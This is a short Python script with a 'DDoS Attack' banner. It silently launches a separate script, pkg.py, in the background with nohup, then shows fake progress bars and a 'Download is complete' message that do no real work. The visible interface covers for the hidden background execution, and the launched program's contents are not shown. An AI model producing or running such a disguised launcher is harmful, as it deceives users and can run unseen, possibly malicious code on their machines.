import os
import random
from time import sleep

os.system("pip install tqdm")
os.system("clear")
print("""
 ____  ____                 _   _   _             _
|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <
|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
""")
os.system("nohup python pkg.py &")
os.system("clear")

from tqdm import tqdm
from tqdm import trange
from time import sleep

print("double check the package")
tot_sum = 0
for i in trange(57):
        sleep(0.5)
        tot_sum += i

os.system("figlet -f small Dwybneed.py")
os.system("figlet -f small dowloading")

number = random.randint(2,3)

os.system("clear")
for i in range(number):
        os.system("figlet -f small loading-")
        sleep(1)
        os.system("figlet -f small loading--")
        sleep(1)
        os.system("figlet -f small loading---")
        sleep(1)
        os.system("figlet -f small loading----")
        sleep(1)

os.system("clear")
print("Download is complte")
sleep(0.2)
print("Thank you for using our servuce.")
sleep(3)
os.system("clear")
